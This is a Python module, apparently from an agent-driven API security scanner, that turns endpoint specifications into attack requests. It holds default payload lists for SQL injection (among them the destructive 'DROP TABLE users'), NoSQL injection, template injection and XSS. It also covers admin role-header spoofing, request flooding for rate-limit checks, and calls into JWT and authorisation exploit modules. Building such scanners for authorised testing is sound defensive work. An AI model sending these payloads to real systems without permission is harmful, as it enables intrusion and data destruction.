"""Central payload factory — converts AgentDecision + EndpointInfo into PayloadRequests."""
from __future__ import annotations

import logging
from typing import Callable

from core.agents.base_agent import AgentDecision
from core.coordinator.task_builder import Task
from core.parser.openapi_parser import EndpointInfo
from core.payload_factory.exploit_modules.bola_exploit import build_bola_payloads
from core.payload_factory.exploit_modules.jwt_exploit import build_jwt_payloads
from core.payload_factory.exploit_modules.mass_assign_exploit import build_mass_assign_payloads
from core.payload_factory.models import PayloadRequest
from core.payload_factory.nuclei_parser import NucleiPayloadAdapter
from core.payload_factory.schema_mutator import get_string_fields, minimal_body

logger = logging.getLogger(__name__)

_ExploitFn = Callable[
    [Task, AgentDecision, EndpointInfo],
    list[PayloadRequest],
]

_EXPLOIT_REGISTRY: dict[str, _ExploitFn] = {
    "jwt_exploit": build_jwt_payloads,
    "bola_exploit": build_bola_payloads,
    "mass_assign_exploit": build_mass_assign_payloads,
}

_DEFAULT_PAYLOADS: dict[str, list[str]] = {
    "sqli": ["' OR 1=1--", "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT null--"],
    "nosqli": ['{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}'],
    "ssti": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"],
    "xss": ['<script>alert(1)</script>', '"><script>alert(1)</script>', "javascript:alert(1)"],
}

_ALL_HTTP_METHODS = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]

_INJECTION_STRATEGIES = frozenset({"sqli", "nosqli", "ssti", "xss"})
_EXPLOIT_DELEGATE_STRATEGIES = frozenset({
    "horizontal_id_enumeration", "uuid_substitution",
    "privilege_field_injection", "role_escalation",
    "jwt_none_algorithm", "jwt_weak_secret_bruteforce",
    "missing_auth_header", "expired_token_reuse",
})


class PayloadFactory:
    """Converts an AgentDecision + EndpointInfo into a list of PayloadRequests."""

    def __init__(self, nuclei_adapter: NucleiPayloadAdapter) -> None:
        self._nuclei = nuclei_adapter

    def build(
        self,
        task: Task,
        decision: AgentDecision,
        endpoint: EndpointInfo,
    ) -> list[PayloadRequest]:
        """Build all payload variants for the given task and decision."""
        results: list[PayloadRequest] = []

        # Try the named exploit module first
        if decision.use_exploit_module:
            builder = _EXPLOIT_REGISTRY.get(decision.use_exploit_module)
            if builder:
                try:
                    results = builder(task, decision, endpoint)
                except Exception as exc:  # noqa: BLE001
                    logger.warning(
                        "Exploit module %s failed for task %s: %s",
                        decision.use_exploit_module,
                        task.task_id,
                        exc,
                    )

        # If module gave nothing, fall through to strategy builders
        if not results:
            for strategy in decision.chosen_strategies:
                try:
                    results.extend(
                        self._build_for_strategy(strategy, task, decision, endpoint)
                    )
                except Exception as exc:  # noqa: BLE001
                    logger.warning(
                        "Strategy %s failed for task %s: %s",
                        strategy,
                        task.task_id,
                        exc,
                    )

        # Guarantee at least one baseline request
        if not results:
            results.append(self._baseline(task, endpoint))

        return results

    # ── Strategy dispatchers ─────────────────────────────────────────────── #

    def _build_for_strategy(
        self,
        strategy: str,
        task: Task,
        decision: AgentDecision,
        endpoint: EndpointInfo,
    ) -> list[PayloadRequest]:
        s = strategy.lower()
        if s == "rate_limit_absence_check":
            return self._rate_limit_payloads(task, decision, endpoint)
        if s in _INJECTION_STRATEGIES:
            return self._injection_payloads(s, task, endpoint)
        if s == "admin_endpoint_access":
            return self._admin_access_payloads(task, decision, endpoint)
        if s == "http_method_enumeration":
            return self._method_enum_payloads(task, endpoint)
        if s in _EXPLOIT_DELEGATE_STRATEGIES:
            # These are handled by exploit modules; if we reach here it's a fallback
            return [self._baseline(task, endpoint)]
        return [self._baseline(task, endpoint)]

    def _rate_limit_payloads(
        self, task: Task, decision: AgentDecision, endpoint: EndpointInfo
    ) -> list[PayloadRequest]:
        count = int(decision.payload_config.get("request_count", 50))
        body = minimal_body(endpoint.body_schema) or None
        return [
            PayloadRequest(
                task_id=task.task_id,
                method=endpoint.method,
                path=endpoint.path,
                body=body,
                strategy="rate_limit_absence_check",
                label=f"rate_limit:req_{i + 1}",
            )
            for i in range(count)
        ]

    def _injection_payloads(
        self, inj_type: str, task: Task, endpoint: EndpointInfo
    ) -> list[PayloadRequest]:
        payloads = (
            self._nuclei.get_payloads(task.vuln_category)
            or _DEFAULT_PAYLOADS.get(inj_type, [])
        )
        string_fields = get_string_fields(endpoint.body_schema)
        string_params = [p["name"] for p in endpoint.params if p.get("type") == "string"]
        results: list[PayloadRequest] = []

        for payload in payloads:
            for param in string_params:
                results.append(PayloadRequest(
                    task_id=task.task_id,
                    method=endpoint.method,
                    path=endpoint.path,
                    query_params={param: payload},
                    strategy=inj_type,
                    label=f"{inj_type}:param={param}",
                ))
            for field_name in string_fields:
                body = minimal_body(endpoint.body_schema)
                body[field_name] = payload
                results.append(PayloadRequest(
                    task_id=task.task_id,
                    method=endpoint.method,
                    path=endpoint.path,
                    headers={"Content-Type": "application/json"},
                    body=body,
                    strategy=inj_type,
                    label=f"{inj_type}:field={field_name}",
                ))
            if not string_params and not string_fields:
                results.append(PayloadRequest(
                    task_id=task.task_id,
                    method=endpoint.method,
                    path=endpoint.path,
                    query_params={"q": payload},
                    strategy=inj_type,
                    label=f"{inj_type}:generic",
                ))

        return results[:200]

    def _admin_access_payloads(
        self, task: Task, decision: AgentDecision, endpoint: EndpointInfo
    ) -> list[PayloadRequest]:
        role_headers: dict[str, str] = decision.payload_config.get(
            "role_headers", {"X-Role": "admin", "X-User-Type": "administrator"}
        )
        base = {
            "task_id": task.task_id,
            "method": endpoint.method,
            "path": endpoint.path,
            "body": None,
            "query_params": {},
            "strategy": "admin_endpoint_access",
        }
        return [
            PayloadRequest(**base, headers={}, label="admin_access:no_auth"),
            PayloadRequest(**base, headers=role_headers, label="admin_access:role_spoof"),
        ]

    def _method_enum_payloads(
        self, task: Task, endpoint: EndpointInfo
    ) -> list[PayloadRequest]:
        return [
            PayloadRequest(
                task_id=task.task_id,
                method=m,
                path=endpoint.path,
                strategy="http_method_enumeration",
                label=f"method_enum:{m}",
            )
            for m in _ALL_HTTP_METHODS
        ]

    @staticmethod
    def _baseline(task: Task, endpoint: EndpointInfo) -> PayloadRequest:
        return PayloadRequest(
            task_id=task.task_id,
            method=endpoint.method,
            path=endpoint.path,
            body=minimal_body(endpoint.body_schema) or None,
            strategy="baseline",
            label="baseline",
        )
